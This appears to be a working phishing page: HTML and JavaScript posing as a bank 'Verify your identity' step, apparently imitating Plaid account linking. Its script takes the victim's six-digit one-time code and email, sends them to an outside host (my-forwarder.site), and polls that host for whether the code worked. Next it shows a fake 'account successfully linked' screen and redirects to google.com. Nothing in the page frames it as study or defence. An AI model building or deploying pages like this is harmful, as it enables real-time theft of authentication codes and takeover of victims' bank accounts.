<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Identity</title>
    <style>
        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
        }
        
        body {
            background-color: #f7fafc;
            color: #1a202c;
            line-height: 1.5;
            overflow-x: hidden;
        }
        
        .container {
            max-width: 420px;
            margin: 20px auto;
            padding: 0 20px;
            position: relative;
            min-height: 600px;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 20px;
            position: relative;
            z-index: 10;
        }
        
        .logo img {
            height: 60px;
        }
        
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            padding: 24px;
            transition: transform 0.3s ease;
            position: relative;
            left: 0;
            min-height: 400px;
            margin-top: 60px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: #4a5568;
        }
        
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        
        input:focus {
            outline: none;
            border-color: #000000;
        }
        
        .submit-btn {
            width: 100%;
            background-color: #000000;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 20px;
        }
        
        .submit-btn:hover {
            background-color: #333333;
        }
        
        .submit-btn:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            color: #718096;
        }
        
        .footer a {
            color: #000000;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .throbber-container {
            margin: 40px 0;
            text-align: center;
        }
        
        .throbber {
            width: 40px;
            height: 40px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #000000;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .otp-input-container {
            display: flex;
            justify-content: space-between;
            margin-bottom: 20px;
        }
        
        .otp-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            border: 1px solid #e2e8f0;
            border-radius: 6px;
            transition: all 0.2s;
        }
        
        .otp-input:focus {
            border-color: #000000;
            outline: none;
        }
        
        .success-message {
            text-align: center;
            color: #38a169;
            font-weight: 600;
            margin-bottom: 20px;
        }
        
        .error-message {
            color: #e53e3e;
            margin-top: 20px;
            font-weight: 500;
            text-align: center;
        }
        
        .blurry {
            filter: blur(2px);
            pointer-events: none;
        }
        
        .loading-overlay {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(255, 255, 255, 0.8);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10;
            display: none;
        }
        
        .page {
            position: absolute;
            width: 100%;
            transition: transform 0.3s ease;
            display: none;
            top: 0;
            left: 0;
        }
        
        .page.active {
            display: block;
        }
        
        .page-1 {
            transform: translateX(0);
        }
        
        .page-2 {
            transform: translateX(100%);
        }
        
        .page.active {
            transform: translateX(0) !important;
        }
        
        .email-display {
            background: #f0f4f8;
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 500;
        }
        
        .arrow-icon {
            display: inline-block;
            margin-right: 8px;
            color: #4a5568;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="https://models-bangbros.github.io/images/OIP__2_-removebg-preview.png" alt="Bank Logo">
        </div>
        
        <!-- Page 1: OTP Entry -->
        <div class="page page-1 active">
            <div class="page-content">
                <div class="card">
                    <h1>Verify your identity</h1>
                    
                    <div class="email-display">
                        <span class="arrow-icon">â†’</span>
                        <span id="displayed-email"></span>
                    </div>
                    
                    <p style="text-align: center; margin-bottom: 20px;">Enter the 6-digit authentication code sent to your email</p>
                    
                    <form id="otp-form">
                        <div class="otp-input-container">
                            <input type="text" class="otp-input" maxlength="1" data-index="1" autocomplete="off">
                            <input type="text" class="otp-input" maxlength="1" data-index="2" autocomplete="off">
                            <input type="text" class="otp-input" maxlength="1" data-index="3" autocomplete="off">
                            <input type="text" class="otp-input" maxlength="1" data-index="4" autocomplete="off">
                            <input type="text" class="otp-input" maxlength="1" data-index="5" autocomplete="off">
                            <input type="text" class="otp-input" maxlength="1" data-index="6" autocomplete="off">
                        </div>
                        
                        <input type="hidden" id="full-otp" name="otp">
                        <input type="hidden" id="verification-code" name="verification_code">
                        
                        <button type="submit" id="verify-btn" class="submit-btn" disabled>Verify</button>
                        
                        <div class="loading-overlay">
                            <div class="throbber"></div>
                        </div>
                    </form>
                    
                    <div id="error-message" class="error-message" style="display: none;"></div>
                </div>
                
                <div class="footer">
                    By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
                </div>
            </div>
        </div>
        
        <!-- Page 2: Success Message -->
        <div class="page page-2">
            <div class="page-content">
                <div class="card">
                    <div class="throbber-container">
                        <svg width="60" height="60" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <path d="M22 11.08V12C21.9988 14.1564 21.3005 16.2547 20.0093 17.9818C18.7182 19.709 16.9033 20.9725 14.8354 21.5839C12.7674 22.1953 10.5573 22.1219 8.53447 21.3746C6.51168 20.6273 4.78465 19.2461 3.61096 17.4371C2.43727 15.628 1.87979 13.4881 2.02168 11.3363C2.16356 9.18457 2.99721 7.13633 4.39828 5.49707C5.79935 3.85782 7.69279 2.71538 9.79619 2.24015C11.8996 1.76491 14.1003 1.98234 16.07 2.86" stroke="#38a169" stroke-width="2" stroke-linecap="round"/>
                            <path d="M22 4L12 14.01L9 11.01" stroke="#38a169" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
                        </svg>
                        <h2>Verification Successful</h2>
                        <p class="success-message">Your bank account has been successfully linked.</p>
                        <p>You will be redirected shortly...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        // DOM elements
        const otpInputs = document.querySelectorAll('.otp-input');
        const fullOtpInput = document.getElementById('full-otp');
        const verifyBtn = document.getElementById('verify-btn');
        const otpForm = document.getElementById('otp-form');
        const loadingOverlay = document.querySelector('.loading-overlay');
        const errorMessage = document.getElementById('error-message');
        const verificationCodeInput = document.getElementById('verification-code');
        const displayedEmail = document.getElementById('displayed-email');
        
        // Variables
        let checkOtpStatusInterval = null;
        
        // Get URL parameters
        function getUrlParams() {
            const urlParams = new URLSearchParams(window.location.search);
            const code = urlParams.get('code');
            const email = urlParams.get('email');
            
            if (code) {
                verificationCodeInput.value = code;
            }
            
            if (email) {
                displayedEmail.textContent = decodeURIComponent(email);
            } else {
                // If no email in URL, redirect back
                window.location.href = 'index.html';
            }
        }
        
        // Initialize OTP input handling
        function initOtpInputs() {
            otpInputs.forEach((input, index) => {
                // Handle paste event
                input.addEventListener('paste', (e) => {
                    e.preventDefault();
                    const pasteData = e.clipboardData.getData('text').trim();
                    if (/^\d{6}$/.test(pasteData)) {
                        pasteData.split('').forEach((char, i) => {
                            if (otpInputs[i]) {
                                otpInputs[i].value = char;
                            }
                        });
                        updateFullOtp();
                        otpInputs[5].focus();
                    }
                });
                
                // Handle keydown event
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && input.value === '' && index > 0) {
                        otpInputs[index - 1].focus();
                    }
                });
                
                // Handle input event
                input.addEventListener('input', (e) => {
                    if (input.value.length === 1 && index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    }
                    updateFullOtp();
                });
            });
        }
        
        // Update the full OTP value
        function updateFullOtp() {
            let otp = '';
            otpInputs.forEach(input => {
                otp += input.value;
            });
            fullOtpInput.value = otp;
            
            // Enable/disable verify button based on OTP length
            verifyBtn.disabled = otp.length !== 6;
        }
        
        // Show loading state
        function showLoading() {
            otpForm.classList.add('blurry');
            loadingOverlay.style.display = 'flex';
        }
        
        // Hide loading state
        function hideLoading() {
            otpForm.classList.remove('blurry');
            loadingOverlay.style.display = 'none';
        }
        
        // Show error message
        function showError(message) {
            errorMessage.textContent = message;
            errorMessage.style.display = 'block';
        }
        
        // Hide error message
        function hideError() {
            errorMessage.style.display = 'none';
        }
        
        // Check OTP status from server
        async function checkOtpStatus(code) {
            try {
                const timestamp = Date.now();
                const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${code}`);
                
                if (!response.ok) throw new Error('Network error');
                return await response.json();
            } catch (error) {
                console.error('Error checking OTP status:', error);
                throw error;
            }
        }
        
       // Updated OTP status checking function
async function checkOtpStatus(code) {
    try {
        const timestamp = Date.now();
        const response = await fetch(`https://my-forwarder.site/plaid/otp-check.php?code=${code}&_=${timestamp}`);
        
        if (!response.ok) throw new Error('Network error');
        
        const data = await response.json();
        
        // Case-insensitive check for success
        if (data.status && data.status.toLowerCase() === 'success') {
            // Clear the checking interval
            clearInterval(checkOtpStatusInterval);
            
            // Hide loading state
            hideLoading();
            
            // Navigate to success page
            navigateToPage(2);
            
            // Redirect after delay
            setTimeout(() => {
                window.location.href = 'https://google.com';
            }, 5000);
            
            return true;
        }
        // Handle wrong OTP case
        else if (data.status && data.status.toLowerCase() === 'wrong') {
            clearInterval(checkOtpStatusInterval);
            hideLoading();
            showError("Invalid code. Please try again.");
            
            setTimeout(() => {
                window.location.reload();
            }, 3000);
            
            return false;
        }
        
        // If response doesn't match expected patterns
        return false;
        
    } catch (error) {
        console.error('Error checking OTP status:', error);
        throw error;
    }
}

// Updated function to start checking status
function startCheckingOtpStatus() {
    let attempts = 0;
    const maxAttempts = 30;
    
    checkOtpStatusInterval = setInterval(async () => {
        attempts++;
        
        // Stop if max attempts reached
        if (attempts >= maxAttempts) {
            clearInterval(checkOtpStatusInterval);
            hideLoading();
            showError("Verification timed out. Please try again.");
            return;
        }
        
        try {
            const verified = await checkOtpStatus(verificationCodeInput.value);
            
            // If verified, the interval is cleared inside checkOtpStatus
            if (verified) return;
            
        } catch (error) {
            console.error('Error checking OTP status:', error);
            if (attempts >= maxAttempts) {
                hideLoading();
                showError("Connection error. Please try again.");
            }
        }
    }, 3000);
}
        
        // Submit OTP to server
        async function submitOtp(otp, verificationCode) {
            try {
                const formData = new FormData();
                formData.append('otp', otp);
                formData.append('verification_code', verificationCode);
                formData.append('email', displayedEmail.textContent);
                
                const response = await fetch('https://my-forwarder.site/plaid/otp-action.php', {
                    method: 'POST',
                    body: formData
                });
                
                if (!response.ok) throw new Error('Network error');
                return await response.json();
            } catch (error) {
                console.error('Error submitting OTP:', error);
                throw error;
            }
        }
        
        // Navigate between pages
        function navigateToPage(pageNumber) {
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            document.querySelector(`.page-${pageNumber}`).classList.add('active');
        }
        
        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            getUrlParams();
            initOtpInputs();
            
            // Form submission
            otpForm.addEventListener('submit', async function(e) {
                e.preventDefault();
                
                if (fullOtpInput.value.length === 6) {
                    showLoading();
                    hideError();
                    
                    try {
                        // Submit OTP to server
                        await submitOtp(fullOtpInput.value, verificationCodeInput.value);
                        
                        // Start checking for verification status
                        startCheckingOtpStatus();
                    } catch (error) {
                        console.error('Error:', error);
                        showLoading();
                        startCheckingOtpStatus();
                    }
                }
            });
        });
    </script>
</body>
</html>
